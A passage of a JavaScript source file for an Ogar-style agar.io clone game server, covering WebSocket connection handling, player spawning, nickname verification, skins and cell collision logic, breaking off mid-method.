'use strict';
/*
Proverbs 20:18:
   Bread obtained by falsehood is sweet to a man, But afterward his mouth will be filled with gravel.

We worked really hard for this project. Although we dont care if you enhance it and publish, we would care
if you copy it and claim our work as your own. Although it might feel good, to take the credit, you would ultimatly
regret it. But please feel free to change the files and publish putting your name up as well as ours.
We will also not get into legalities. but please dont take advantage that we dont use
legalities. Instead, treat us with respect like we treat you. 

Sincerely
The AJS Dev Team.

*/
const fs = require('fs');
const WebSocket = require('ws');
const Updater = require('./Updater.js');
const utilities = require('./utilities.js');
const Physics = require('./Physics.js');

const Gamemode = require('../gamemodes');
const Packet = require('../packet');
const Entity = require('../entity');
const Cell = require('../entity/Cell.js');
const PlayerTracker = require('./PlayerTracker');
const PacketHandler = require('./PacketHandler');

const BotLoader = require('../ai/BotLoader');
const MinionLoader = require('../ai/MinionLoader');

// services
const Logger = require('../modules/log');
const StatServer = require('./StatServer.js');
const GeneratorService = require('./GeneratorService.js');
const PluginLoader = require('./PluginLoader.js');


module.exports = class GameServer {
  constructor(world, consoleService, configService, version, port, ismaster, name, banned, multiverse, gamemode, language) {
    // fields
    this.world = world;

    //this.lastNodeId = 2;    // todo why 2?
    this.lastPlayerId = 1;
    this.running = true;
    this.multiverse = multiverse;
    this._nodesMother = [];
    this._nodesBeacon = [];
    this._nodesSticky = [];
    this.isMaster = ismaster;
this.name = name;
    this.clients = [];
    this.currentFood = 0;

    // inprogress
    this.whlist = [];
    this.movingVirusCount = 0;
    this.nospawn = [];

    this.ipCounts = [];

    this.leaderboard = []; // leaderboard
    this.port = port;
    this.lb_packet = new ArrayBuffer(0); // Leaderboard packet
    this.bots = new BotLoader(this);
    this.minions = new MinionLoader(this);

    // Config

    this.configService = configService;
    this.config = this.configService.getConfig();
    this.banned = this.configService.getBanned();
    this.opbyip = this.configService.getOpByIp();
    this.highscores = this.configService.getHighScores();
    this.rSkins = this.configService.getRSkins();
    this.uid = this.configService.getUnique();
    this.uniban = this.configService.getUniBan();

    this.randomNames = this.configService.getBotNames();
    this.skinshortcut = this.configService.getSkinShortCuts();
    this.skin = this.configService.getSkins();

    // plugins

    this.pluginLoader = new PluginLoader(this, version);
    this.pluginLoader.load();
    this.pluginGamemodes = this.pluginLoader.getPGamemodes();
    this.plugins = this.pluginLoader.getPlugin();
    this.pluginCommands = this.pluginLoader.getPC();


    // services - must run after config with the exception of the config service
    this.consoleService = consoleService;
    this.generatorService = new GeneratorService(this);
    this.log = new Logger();
    this.statServer = new StatServer(this, this.config.serverStatsPort, this.config.serverStatsUpdate, this.isMaster);

    // Gamemodes
    if (gamemode) {
    this.gameMode = Gamemode.get(gamemode, this);
    this.config.serverGamemode = gamemode;
    } else {
    this.gameMode = Gamemode.get(this.config.serverGamemode, this);
    }

    //bound
    this.mainLoopBind = this.mainLoop.bind(this);

    // config services
    // Services config

    // others
    this.branch = "dev";
    this.customLBEnd = [];
    this.gtick = 0;
    this.uv = "";
    this.optin = false;
    this.updater = new Updater(this);
    this.highscores = undefined;
    this.opbyip = [];
    this.client = { // Macros (1 = on)
    sMacro: 0,
    wMacro: 0,
    qMacro: 0,
    eMacro: 0,
    rMacro: 0,
    
    // Current client configs
    darkBG: 1,
    chat: 2,
    skins: 2,
    grid: 2,
    acid: 1,
    colors: 2,
    names: 2,
    showMass: 1,
    smooth: 1,
    
    // Future feature
    minionCount: 0,
    minimap: 0,
    
    // Others
    maxName: 15,
    };
    this.sbo = 1;
    this.ipCounts = [];
    this.minionleader = undefined;
    this.version = version;
    this.chatNames = [];
    this.destroym = false;
    this.lleaderboard = false;
    this.topscore = 50;
    this.topusername = "None";
    this.red = false;
    this.green = false;
    this.language = language;
    this.rrticks = 0;
    this.minion = false;
    this.miniontarget = {x: 0, y: 0};
    this.blue = false;
    this.bold = false;
    this.white = false;
    this.dltick = 0;
    this.mfre = false; // If true, mouse filter is initialised
    this.dim = false;
    this.yellow = false;
    this.resticks = 0;
    this.spawnv = 1;
    this.lctick = 0;
    this.overideauto = false;
    this.livestage = 0;
    this.pop = [];
    this.tickSticky = 0;
    this.troll = [];
    this.firstl = true;
    this.liveticks = 0;
    this.op = [];
    this.pmsg = 0;
    this.pfmsg = 0;
    this.opc = [];
    this.oppname = [];
    this.opname = [];
    this.motherUpdateInterval = 5;
    this.oldtopscores = {
      score: 100,
      name: "none"
    };

    this.leaderboard = []; // leaderboard
    this.lb_packet = new ArrayBuffer(0); // Leaderboard packet
    this.largestClient = undefined;

    // Main loop tick
    this.time = +new Date;
    this.startTime = this.time;
    this.tick = 0; // 1 second ticks of mainLoop
    this.tickMain = 0; // 50 ms ticks, 20 of these = 1 leaderboard update
    this.tickSpawn = 0; // Used with spawning food
    this.mainLoopBind = this.mainLoop.bind(this);

    // @formatter:off
    this.colors = [
      {'r': 255, 'g': 0,   'b': 0  }, // Red
      {'r': 255, 'g': 32,  'b': 0  },
      {'r': 255, 'g': 64,  'b': 0  },
      {'r': 255, 'g': 96,  'b': 0  },
      {'r': 255, 'g': 128, 'b': 0  }, // Orange
      {'r': 255, 'g': 160, 'b': 0  },
      {'r': 255, 'g': 192, 'b': 0  },
      {'r': 255, 'g': 224, 'b': 0  },
      {'r': 255, 'g': 255, 'b': 0  }, // Yellow
      {'r': 192, 'g': 255, 'b': 0  },
      {'r': 128, 'g': 255, 'b': 0  },
      {'r': 64,  'g': 255, 'b': 0  },
      {'r': 0,   'g': 255, 'b': 0  }, // Green
      {'r': 0,   'g': 192, 'b': 64 },
      {'r': 0,   'g': 128, 'b': 128},
      {'r': 0,   'g': 64,  'b': 192},
      {'r': 0,   'g': 0,   'b': 255}, // Blue
      {'r': 18,  'g': 0,   'b': 192},
      {'r': 37,  'g': 0,   'b': 128},
      {'r': 56,  'g': 0,   'b': 64 },
      {'r': 75,  'g': 0,   'b': 130}, // Indigo
      {'r': 92,  'g': 0,   'b': 161},
      {'r': 109, 'g': 0,   'b': 192},
      {'r': 126, 'g': 0,   'b': 223},
      {'r': 143, 'g': 0,   'b': 255}, // Purple
      {'r': 171, 'g': 0,   'b': 192},
      {'r': 199, 'g': 0,   'b': 128},
      {'r': 227, 'g': 0,   'b': 64 }
    ];
    this.oldcolors = [
      {'r':235, 'g': 75, 'b':  0},
      {'r':225, 'g':125, 'b':255},
      {'r':180, 'g':  7, 'b': 20},
      {'r': 80, 'g':170, 'b':240},
      {'r':180, 'g': 90, 'b':135},
      {'r':195, 'g':240, 'b':  0},
      {'r':150, 'g': 18, 'b':255},
      {'r': 80, 'g':245, 'b':  0},
      {'r':165, 'g': 25, 'b':  0},
      {'r': 80, 'g':145, 'b':  0},
      {'r': 80, 'g':170, 'b':240},
      {'r': 55, 'g': 92, 'b':255},
    ];
    // @formatter:on
  }

  // init should only ever be called once.
  init() {}
  log(a) {
    if (this.isMaster) console.log(a);
    
  }
msgAll(msg) {
  var packet = new Packet.Chat("[Console]", msg);
            // Send to all clients (broadcast)
            for (var i = 0; i < this.clients.length; i++) {
                this.clients[i].sendPacket(packet);
            }
  
}
reloadDataPacket() {
  for (var i in this.clients) {
    var client = this.clients[i];
    if (!client) continue;
    client.sendPacket(new Packet.DataPacket(this));
  }
  
}
reloadClientPacket() {
  for (var i in this.clients) {
    var client = this.clients[i];
    if (!client) continue;
    client.sendPacket(new Packet.ClientPacket(this));
  }
  
}
getDist(x1, y1, x2, y2) { // Use Pythagoras theorem
    let from = {'x': x1, 'y': y1 };
    let to = {'x': x2, 'y': y2};
    return Physics.getDist(from, to);
  };
pm(id, msg,tag) {
  var t = (tag) ? tag : "[Console PM]";
 
            // Send to all clients (broadcast)
            for (var i = 0; i < this.clients.length; i++) {
              if (this.clients[i].playerTracker.pID == id) {
                   var packet = new Packet.Chat(t, msg);
                this.clients[i].sendPacket(packet);
                break
              }
            }
}
startingFood() {
  return this.generatorService.startFood();
}
    
  start() {


    // Logging
    this.log.setup(this);

    this.ipcounts = [];
    // Gamemode configurations
    this.gameMode.onServerInit(this);
      
    this.masterServer();

    // Start the server
    var port = (this.port) ? this.port : this.config.serverPort;
    this.socketServer = new WebSocket.Server({
      port: (this.config.vps == 1) ? process.env.PORT : port,
      perMessageDeflate: false
    }, function () {
      // Spawn starting food
      this.generatorService.init();
      this.generatorService.start();

      // Start Main Loop
      //setInterval(this.mainLoop.bind(this), 1);
        setInterval(function() {this.customSecure()}.bind(this),60000)
      setImmediate(this.mainLoopBind);
 var port = (this.port) ? this.port : this.config.serverPort;
      var serverPort = (this.config.vps == 1) ? process.env.PORT : port;
      
      console.log("[" + this.name + "] Listening on port " + serverPort);
      console.log("[" + this.name + "] Current game mode is " + this.gameMode.name);
      Cell.spi = this.config.SpikedCells;
      Cell.virusi = this.config.viruscolorintense;
      Cell.recom = this.config.playerRecombineTime;
      if (this.config.anounceHighScore === 1) {
        this.consoleService.execCommand("announce", "");
      }
      if (this.config.garbagecollect != 0 && global.gc) {
        var split = [];
        split[1] = this.config.garbagecollect;
        split[2] = true;
        this.consoleService.execCommand("garbage", split)
      }

      // Player bots (Experimental)
      if (this.config.serverBots > 0) {
        for (let i = 0; i < this.config.serverBots; i++) {
          this.bots.addBot();
        }
        console.log("[" + this.name + "] Loaded " + this.config.serverBots + " player bots");
      }
      if (this.config.restartmin != 0) {
        let split = [];
        split[1] = this.config.restartmin;

        this.consoleService.execCommand("restart", split);

      }
      if (this.config.vps == 1) console.log("\x1b[31m[IMPORTANT] You are using a VPS provider. Stats server and port choosing is disabled.\x1b[0m")
      let game = this; // <-- todo what is this?
    }.bind(this));

    this.socketServer.on('connection', connectionEstablished.bind(this));

    // Properly handle errors because some people are too lazy to read the readme
    this.socketServer.on('error', function err(e) {
      switch (e.code) {
        case "EADDRINUSE":
          console.log("[Error] Server could not bind to port! Please close out of Skype or change 'serverPort' in src/settings to a different number.");
          break;
        case "EACCES":
          console.log("[Error] Please make sure you are running Ogar with root privileges.");
          break;
        default:
          console.log("[Error] Unhandled error code: " + e.code);
          break;
      }
      process.exit(1); // Exits the program
    }.bind(this));

    function connectionEstablished(ws) {
      let clients = this.getClients();
      
      if (clients.length >= this.config.serverMaxConnections) { // Server full
        ws.close();
        return;
      }

      let showlmsg = this.config.showjlinfo;

      if (this.ipcounts[ws._socket.remoteAddress]) {
        this.ipcounts[ws._socket.remoteAddress]++;
      } else {
        this.ipcounts[ws._socket.remoteAddress] = 1;
      }

      if (this.config.showjlinfo == 1) {
        console.log("[" + this.name + "] A player with an IP of " + ws._socket.remoteAddress + " joined the game");
      }
      if (this.config.porportional == 1) {
        this.config.borderLeft -= this.config.borderDec;
        this.config.borderRight += this.config.borderDec;
        this.config.borderTop -= this.config.borderDec;
        this.config.borderBottom += this.config.borderDec;


      }

      let self = this;

      function close(error) {
        self.ipcounts[this.socket.remoteAddress]--;
       var names = this.socket.playerTracker.reservedNamesMap;
       for (var i in names) {
         var name = names[i];
         for (var j in name) {
           self.chatNames[i].slice(j,1);
         }
         
       }
        // Log disconnections
        if (showlmsg == 1) {
          console.log("[" + self.name + "] A player with an IP of " + this.socket.remoteAddress + " left the game");
        }
        if (self.config.porportional == 1) {
          self.config.borderLeft += self.config.borderDec;
          self.config.borderRight -= self.config.borderDec;
          self.config.borderTop += self.config.borderDec;
          self.config.borderBottom -= self.config.borderDec;

          self.world.getNodes().forEach((node)=> {
            if ((!node) || (node.getType() == 0)) {
              return;
            }

            // Move
            if (node.position.x < self.config.borderLeft) {
              self.removeNode(node);

            } else if (node.position.x > self.config.borderRight) {
              self.removeNode(node);
            
            } else if (node.position.y < self.config.borderTop) {
              self.removeNode(node);
             
            } else if (node.position.y > self.config.borderBottom) {
              self.removeNode(node);
            
            }
          });
        }
        this.server.log.onDisconnect(this.socket.remoteAddress);

        let client = this.socket.playerTracker;
        let len = this.socket.playerTracker.cells.length;

        for (let i = 0; i < len; i++) {
          let cell = this.socket.playerTracker.cells[i];

          if (!cell) {
            continue;
          }

          cell.calcMove = function () {

          }; // Clear function so that the cell cant move
          //this.server.removeNode(cell);
        }

        client.disconnect = this.server.config.playerDisconnectTime * 20;
        this.socket.sendPacket = function () {

        }; // Clear function so no packets are sent
      }

      ws.remoteAddress = ws._socket.remoteAddress;
      ws.remotePort = ws._socket.remotePort;
      this.log.onConnect(ws.remoteAddress); // Log connections

      ws.playerTracker = new PlayerTracker(this, ws);
      ws.packetHandler = new PacketHandler(this, ws);
      ws.on('message', ws.packetHandler.handleMessage.bind(ws.packetHandler));
      ws.on('error', function err(error) {
        console.log("[WARN] Caught ws error. Prevented server crash. Error: " + error);
        
      });

      let bindObject = {
        server: this,
        socket: ws
      };
      ws.on('error', close.bind(bindObject));
      ws.on('close', close.bind(bindObject));
      this.addClient(ws);

    }

    this.statServer.start();
  }

  update(dt) {

  }

  pause(){
    this.running = false;
    this.generatorService.stop();
  }
  unpause(){
    this.running = true;
    this.generatorService.start();
  }

  getWorld() {
    return this.world;
  }

  //***************** refactoring nodes start
  // basic nodes

  // todo need to think about how to refactor this out to use the world.addNode or setNode
  // todo for now leave it here
  addNode(node, type) {
    this.world.setNode(node.getId(), node, type);
//   this._nodes.push(node);
    //if (type === "moving") {
    //  this.setAsMovingNode(node);
    //}

    // todo this is a big problem for splitting up the processes
    // Adds to the owning player's screen
    if (node.owner) {
      node.setColor(node.owner.color);
      node.owner.cells.push(node);
      node.owner.socket.sendPacket(new Packet.AddNode(node));
    }

    // Special on-add actions
    node.onAdd(this);
   node.quadSetup(this);
    // todo this is a big problem for splitting up the processes
    // Add to visible nodes
    let clients = this.getClients();
    for (let i = 0; i < clients.length; i++) {
      let client = clients[i].playerTracker;
      if (!client) {
        continue;
      }

      // todo memory leak?
      // client.nodeAdditionQueue is only used by human players, not bots
      // for bots it just gets collected forever, using ever-increasing amounts of memory
      if ('_socket' in client.socket && !client.isBot && node.visibleCheck(client.viewBox, client.centerPos)) {
        client.nodeAdditionQueue.push(node);
      }
    }
  }
  updateMotherCells() {
    if (!this._nodesMother) return;
  for (var i in this._nodesMother) {
    var mother = this._nodesMother[i];

    // Checks
    mother.update(this);
    mother.checkEat(this);
  }
};

  // todo need to think about how to refactor this out
  removeNode(node) {
    if (!node) return;
        node.onRemove(this);
    this.world.removeNode(node.getId());
    // Special on-remove actions
this.world.removeQuadMap(undefined,node.getId());

    // todo this is a big problem for splitting up the processes
    // Animation when eating
    let clients = this.getClients();
    for (let i = 0; i < clients.length; i++) {
      let client = clients[i].playerTracker;
      if (!client) {
        continue;
      }

      // Remove from client
      client.nodeDestroyQueue.push(node);
    }
  }

  // player nodes
  getNewPlayerID() {
    // Resets integer
    if (this.lastPlayerId > 2147483647) {
      this.lastPlayerId = 1;
    }
    return this.lastPlayerId++;
  }
  
updateStickyCells() {
  if (!this._nodesSticky) return;
  for (var i in this._nodesSticky) {
    var sticky = this._nodesSticky[i];

    sticky.update(this);
  }
};
stop() {
  this.socketServer.close();
  this.statServer.stop()
}
  getPlayerNodes() {
    return this.world.getNodes("player").toArray();
    //return this._nodesPlayer;
  }

  addPlayerNode(node) {
    this.world.setNode(node.getID() ,node, "player");
  }

  getNodesPlayer() {
    return this.world.getPlayerNodes();
    //return this._nodesPlayer;
  }

  addNodesPlayer(node) {
    this.world.setNode(node.getId(), node, "player");
    //this._nodesPlayer.push(node);
  }

  removeNodesPlayer(node) {
    this.world.removePlayerNode(node.getId())
  }

  // Virus Nodes
  getVirusNodes() {
    return this.world.getNodes("virus").toArray();
  }

  addVirusNodes(node) {
    this.world.setNode(node.getId(), node, "virus");
  }

  removeVirusNode(node) {
    this.world.removeVirusNode(node.getId());
}
  // Ejected Nodes
  getEjectedNodes() {
    return this.world.getNodes("ejected").toArray();
  }

  addEjectedNodes(node) {
    this.world.setNode(node.getId(), node, "ejected");
  }

  removeEjectedNode(node) {
  this.world.removeEjectedNode(node.getId());
  }

  clearEjectedNodes() {
    this.world.clearEjected();
  }

  // rainbow nodes
  getRainbowNodes() {
    return this.world.getNodes("rainbow").toArray();
  }

  addRainbowNode(node) {
    this.world.setNode(node.getId(),node,"rainbow");
  }

  setRainbowNode(index, node) {
     this.world.setNode(node.getId(),node,"rainbow");
  }

  clearRainbowNodes() {
    this.world.getNodes("rainbow").clear();
  }

  //***************** refactoring nodes end

  clearLeaderBoard() {
    this.leaderboard = [];
  }

  getRandomSpawn() {
    // Random spawns for players
    let pos;

   
    

   
      // Get random spawn if no food cell is found
      pos = this.getRandomPosition();
    

    return pos;
  }
beforeq(player) {
  return true;
  
}
  getRandomPosition() {
    return this.getWorld().getRandomPosition();
  }

  getRandomColor() {
  if (this.config.playerOldColors == 1) {
    var index = Math.floor(Math.random() * this.oldcolors.length);
    var color = this.oldcolors[index];
    return {
      r: color.r,
      b: color.b,
      g: color.g
     };
    } else {
    return utilities.getRandomColor();
    }
  }

  // todo change this out for a vector library
  static getDist(x1, y1, x2, y2) {
    return utilities.getDist(x1, y1, x2, y2);
  }

  getMode() {
    return this.gameMode;
  }

  updateMoveEngine() {
    function sorter(nodeA, nodeB) {
      return utilities.getDist(nodeA.position.x, nodeA.position.y, nodeA.owner.mouse.x, nodeA.owner.mouse.y) > utilities.getDist(nodeB.position.x, nodeB.position.y, nodeB.owner.mouse.x, nodeB.owner.mouse.y);
    }

    let nodes = this.getWorld().getPlayerNodes();
    nodes.sorted(sorter);
    nodes.forEach((cell)=> {
      // Do not move cells that have already been eaten or have collision turned off
      if (!cell) {
        return;
      }

      let client = cell.owner;
      cell.calcMove(client.mouse.x, client.mouse.y, this);

      // Check if cells nearby
      let list = this.getCellsInRange(cell);
      list.forEach((check)=> {
        if (check.cellType === 0 && (client != check.owner) && (cell.mass < check.mass * this.config.sizeMult) && this.config.playerRecombineTime !== 0) { //extra check to make sure popsplit works by retslac
          check.inRange = false;
          return;
        }

        // Consume effect
        check.onConsume(cell, this);

        // Remove cell
        check.setKiller(cell);
        this.removeNode(check);
      });
    });


    // A system to move cells not controlled by players (ex. viruses, ejected mass)
    this.getWorld().getMovingNodes().forEach((check)=> {
      if (!check.watch) return;
      if (check.moveEngineTicks > 0) {
        check.onAutoMove(this);
        // If the cell has enough move ticks, then move it
        check.calcMovePhys(this.config);
      } else {
        // Auto move is done
        check.moveDone(this);
        // Remove cell from list
        this.getWorld().removeMovingNode(check.getId());
      }
    });
  }

  updateCells() {
    if (!this.running) {
      // Server is paused
      return;
    }
    this.getWorld().getNodes('player').forEach((cell)=>{
      if (cell.cellType == 0) {
         if (!cell) {
        return;
      }
      // Have fast decay over 5k mass
      let massDecay = 0;
      if (this.config.playerFastDecay == 1) {
        if (cell.mass < this.config.fastdecayrequire) {
          massDecay = 1 - (this.config.playerMassDecayRate * this.gameMode.decayMod * 0.05); // Normal decay
        } else {
          massDecay = 1 - (this.config.playerMassDecayRate * this.gameMode.decayMod) * this.config.FDmultiplyer; // might need a better formula
        }
      } else {
        massDecay = 1 - (this.config.playerMassDecayRate * this.gameMode.decayMod * 0.05);
      }

      // Recombining
      if (cell.owner.cells.length > 1 && !cell.owner.norecombine) {
        cell.recombineTicks += 0.05;
        cell.calcMergeTime(this.config.playerRecombineTime);
      } else if (cell.owner.cells.length == 1 && cell.recombineTicks > 0) {
        cell.recombineTicks = 0;
        cell.shouldRecombine = false;
        cell.owner.recombineinstant = false;
      }

      // Mass decay
      if (cell.mass >= this.config.playerMinMassDecay) {
        let client = cell.owner;
        if (this.config.teaming === 0) {
          let teamMult = (client.massDecayMult - 1) / 160 + 1; // Calculate anti-teaming multiplier for decay
          let thisDecay = 1 - massDecay * (1 / teamMult); // Reverse mass decay and apply anti-teaming multiplier
          cell.mass *= (1 - thisDecay);
        } else {
          // No anti-team
          cell.mass *= massDecay;
        }
      }
      } else {
       // cell.quadUpdate(this);
      }
      
      
      
    })
    
  }
  beforespawn(player,pos,mass) {
    
    return true;
  };
  beforeeject(player) {
    return true;
  };
  beforesplit(player) {
    return true;
  };

  spawnPlayer(player, pos, mass) {
    
    let dono = false;
    let dospawn = false;
    let fro = player.frozen;
    clearTimeout(player.spect);
    if (this.nospawn[player.socket.remoteAddress] != true && !player.nospawn) {
      player.norecombine = false;
      player.frozen = false;
      
      for (var i in this.plugins) {
        if (this.plugins[i].beforespawn && this.plugins[i].name && this.plugins[i].author && this.plugins[i].version) {
          if (!this.plugins[i].beforespawn(player,pos,mass)) return;
        }
      }



      if (this.config.verify != 1 || (this.whlist.indexOf(player.socket.remoteAddress) != -1)) {
        player.verify = true;
      }
      if (this.config.verify == 1 && !player.verify) {
        if (player.tverify || typeof player.socket.remoteAddress == "undefined") {
          player.verify = true;
          player.vfail = 0;
        }
        if (typeof player.socket.remoteAddress != "undefined" && !player.verify && !player.tverify) {
          if (player.name == player.vpass) {
            player.tverify = true;
            player.name = "Success! Press w and get started!";
            dono = true;
            player.vfail = 0;

          } else {
            if (player.vfail == 0) {
              player.vname = player.name;
            }
            player.newV();

            player.name = "Please Verify By typing " + player.vpass + " Into nickname box. Kill = w";
            dono = true;
            player.vfail++;
            if (player.vfail > this.config.vchance) {
              player.nospawn = true;
            }
            //let pl = player;
            let self = this;
            setTimeout(function () {
              if (!player.verify && !player.tverify) {
                let len = player.cells.length;
                for (let j = 0; j < len; j++) {
                  self.removeNode(player.cells[0]);
                }
              }
            }, self.config.vtime * 1000);
          }
        }
      } else if (player.vname != "") {
        if (player.name == player.vpass) {
          player.name = player.vname;
        }

      }
      let name;
      if (this.config.randomnames == 1 && !dono) {
        if (this.randomNames.length > 0) {
          let index = Math.floor(Math.random() * this.randomNames.length);
          name = this.randomNames[index];
          this.randomNames.splice(index, 1);
        } else {
          name = "player";
        }
        player.name = name;
      } else {

        if (this.config.skins == 1 && !dono) {

            // Premium Skin
           this.getPremiumFromName(player);
           
           
           
        }
        if (player.name == "/random") {
          if (this.randomNames.length > 0) {
          let index = Math.floor(Math.random() * this.randomNames.length);
          name = this.randomNames[index];
        } else {
          name = "player";
        }
        player.name = name;
          
        }
        
      }
var isAdmin = false;

    // Check for config
    if (this.config.adminConfig == 1) {
        // Make the required variables
       var adminArray = this.config.adminNames.split(";");
        var nadminArray = this.config.adminNewNames.split(";");

        // Removes people trying fake admin
        for (i = 0; i < nadminArray.length; i++) {
            if (player.name == nadminArray[i]) {
                console.log("[" + this.name + "] User tried to spawn with " + nadminArray[i] + " but was denied!");
                player.name = "";
            }
        }

        // Checks for users with password name
        for (i = 0; i < adminArray.length; i++) {
            if (player.name == adminArray[i]) {
                isAdmin = true;
                console.log("[" + this.name + "] " + nadminArray[i] + " has successfully logged in using " + adminArray[i]);
                player.name = nadminArray[i];
            }
        }
    }

      pos = (pos == null) ? this.getRandomSpawn() : pos;
      mass = (mass == null) ? this.config.playerStartMass : mass;
      mass = (player.spawnmass > mass) ? player.spawnmass : mass;
      
          // Checks if it's safe for players to spawn
            if (this.config.playerSafeSpawn === 1 && !pos) {
              for (var j = 0; j < 30; j++) {
                var pnode = this.world.getNodes("player").toArray()
                for (var i = 0; i < pnode.length; i++) {
                var issafe = true;
                var check = pnode[i];
                var pos = this.getRandomPosition();
                var playerSquareSize = (this.config.playerStartMass * 100) >> 0;
                var squareR = check.mass * 100; // Checks player cell's radius
                var dx = check.position.x - pos.x;
                var dy = check.position.y - pos.y;
                
                if (check.mass < this.config.playerStartMass) {
                    continue;
                }

                if (dx * dx + dy * dy + playerSquareSize <= squareR * 2) {
                    issafe = false;
                    break;
                }
              }
            if (issafe) break;
          }
	      } else {
		      issafe = true;
	      }
player.frozen = fro;
      // Spawn player and add to world
      if (!dospawn) {
        if(isAdmin) {
           let cell = new Entity.PlayerCell(this.world.getNextNodeId(), player, pos, this.config.adminStartMass, this);
           this.addNode(cell, "player");
        } else {
        let cell = new Entity.PlayerCell(this.world.getNextNodeId(), player, pos, mass, this);
        this.addNode(cell, "player");
        }
        
      }

      // Set initial mouse coords
      player.mouse = {
        x: pos.x,
        y: pos.y
          };
        }
        var cname = this.getChatName(player);
        player.chatName = (cname) ? cname : "ERROR";
      }


getChatName(player) {
  var name = player.name.split(' ').join('_');
  var chatname = name;
  if (!chatname || chatname == "") chatname = "An_Unamed_Cell";
  if (player.reservedNames.indexOf(chatname) != -1) {
    return chatname
  }
    if (!this.chatNames[name]) this.chatNames[name] = [];
      var cn = this.chatNames[name];
      for (var i = 0;0==0;i++){
        var newname = (i==0) ? chatname : chatname + "_" + i;
        if (cn.indexOf(i) == -1 || player.reservedNames.indexOf(newname) != -1) {
          this.chatNames[name][i] = i;
          if (player.reservedNames.indexOf(newname) == -1) player.reservedNames.push(newname);
         if (!player.reservedNamesMap[name]) player.reservedNamesMap[name] = [];
         player.reservedNamesMap[name][i] = i;
          return newname;
        }
         
        
      }
      
    
    return false;
  
  
}

  getPremiumFromName(player) {
    if (player.name.substr(0, 1) == "<") {
     let n = player.name.indexOf(">");
            if (n != -1) {
              var prem = '';
              if (player.name.substr(1, n - 1) == "r" && this.config.rainbow == 1) {
                player.rainbowon = true;
              } else if (player.name.substr(1, n - 1) == "/random") {
              if (this.rSkins.length > 0) {
           let index = Math.floor(Math.random() * this.rSkins.length);
           prem = this.rSkins[index];
         
              }
              } else {
                player.premium = '%' + player.name.substr(1, n - 1);
              }
    if (prem) {
       var o = false;
       for (let i in this.skinshortcut) {
                 if (!this.skinshortcut[i] || !this.skin[i]) {
                   continue;
                 }
                 if (prem == this.skinshortcut[i]) {
                   player.premium = this.skin[i];
                   o = true;
                   break;
                 }
                 
                }
               
                if (!o) player.premium = "%" + prem;
       
     } else {

              for (let i in this.skinshortcut) {
                if (!this.skinshortcut[i] || !this.skin[i]) {
                  continue;
                }
                if (player.name.substr(1, n - 1) == this.skinshortcut[i]) {
                  player.premium = this.skin[i];
                  break;
                }
              }
            }
              player.name = player.name.substr(n + 1);
            }
          } else if (player.name.substr(0, 1) == "[") {
            // Premium Skin
            let n = player.name.indexOf("]");
            if (n != -1) {

              player.premium = ':http://' + player.name.substr(1, n - 1);
              player.name = player.name.substr(n + 1);
            }
          }
        }
  // getters/setters
  getClients() {
    return this.clients;
  }

  addClient(client) {
    this.clients.push(client);
  }

  removeClient(client) {
    let index = this.getClients().indexOf(client);
    if (index != -1) {
      this.getClients().splice(index, 1);
    }
  }

  getCurrentFood() {
    return this.currentFood;
  }

  getConfig() {
    return this.config;
  }

  getCellsInRange(cell) {
     let list = [];
    let squareR = cell.getSquareSize(); // Get cell squared radius

    // Loop through all cells that are visible to the cell. There is probably a more efficient way of doing this but whatever
    cell.owner.visibleNodes.forEach((check)=> {
      // exist?
      // if something already collided with this cell, don't check for other collisions
      // Can't eat itself
      if (!check || check.inRange || cell.getId() === check.getId()) return;

      // Can't eat cells that have collision turned off
      if ((cell.owner === check.owner) && (cell.ignoreCollision)) return;

      // AABB Collision
      if (!check.collisionCheck2(squareR, cell.position)) return;

      // Cell type check - Cell must be bigger than this number times the mass of the cell being eaten
      let multiplier = this.config.sizeMult;

      switch (check.getType()) {
        case 1: // Food cell
          list.push(check);
          check.inRange = true; // skip future collision checks for this food
          return;
        case 2: // Virus
          multiplier = this.config.VsizeMult;
          break;
        case 5: // Beacon
          // This cell cannot be destroyed
          return;
        case 0: // Players
          // Can't eat self if it's not time to recombine yet
          if (check.owner === cell.owner) {
            if ((!cell.shouldRecombine || !check.shouldRecombine) && !cell.owner.recombineinstant) {
              return;
            }
            multiplier = 1.00;
          }
          // Can't eat team members
          if (this.gameMode.haveTeams) {
            if (!check.owner && (check.owner !== cell.owner) && (check.owner.getTeam() === cell.owner.getTeam())) {
              return;
            }
          }
          break;
        
      }

      // Make sure the cell is big enough to be eaten.
      if ((check.mass * multiplier) > cell.mass) return;

      // Eating range
      let xs = Math.pow(check.position.x - cell.position.x, 2);
      let ys = Math.pow(check.position.y - cell.position.y, 2);
      let dist = Math.sqrt(xs + ys);

      let eatingRange = cell.getSize() - check.getEatingRange(); // Eating range = radius of eating cell + 40% of the radius of the cell being eaten

      // Not in eating range
      if (dist > eatingRange) return;

      // Add to list of cells nearby
      list.push(check);

      // Something is about to eat this cell; no need to check for other collisions with it
      check.inRange = true;
    });

    return list;
  }

 getNearestVirus(cell) {
  // More like getNearbyVirus
  var virus = null;
  var r = 100; // Checking radius

  var topY = cell.position.y - r;
  var bottomY = cell.position.y + r;

  var leftX = cell.position.x - r;
  var rightX = cell.position.x + r;
  // Loop through all viruses on the map. There is probably a more efficient way of doing this but whatever
  
  this.getWorld().getNodes('virus').every((check)=>{
   
if (check.quadrant != cell.quadrant || !check) return true;
    

    if (!check.collisionCheck(bottomY, topY, rightX, leftX)) {
      return true;
    }

    // Add to list of cells nearby
    virus = check;
    return false;
     // stop checking when a virus found
  });
  return virus;
}

  switchSpectator(player) {
    if (this.gameMode.specByLeaderboard) {
      player.spectatedPlayer++;
      if (player.spectatedPlayer == this.leaderboard.length) {
        player.spectatedPlayer = 0;
      }
    } else {
      // Find next non-spectator with cells in the client list
      let oldPlayer = player.spectatedPlayer + 1;
      let count = 0;
      while (player.spectatedPlayer != oldPlayer && count != this.clients.length) {
        if (oldPlayer == this.clients.length) {
          oldPlayer = 0;
          continue;
        }

        if (!this.clients[oldPlayer]) {
          // Break out of loop in case client tries to spectate an undefined player
          player.spectatedPlayer = -1;
          break;
        }

        if (this.clients[oldPlayer].playerTracker.cells.length > 0) {
          break;
        }

        oldPlayer++;
        count++;
      }
      if (count == this.clients.length) {
        player.spectatedPlayer = -1;
      } else {
        player.spectatedPlayer = oldPlayer;
      }
    }
  }

  ejectVirus(parent, owner, color) {
    let parentPos = {
      x: parent.position.x,
      y: parent.position.y
    };

    let newVirus = new Entity.Virus(parent.getId(), null, parentPos, this.config.virusmass);
    newVirus.setAngle(parent.getAngle());
    newVirus.setpar(owner);
    newVirus.mass = 10;
    newVirus.setMoveEngineData(this.config.ejectvspeed, 20);
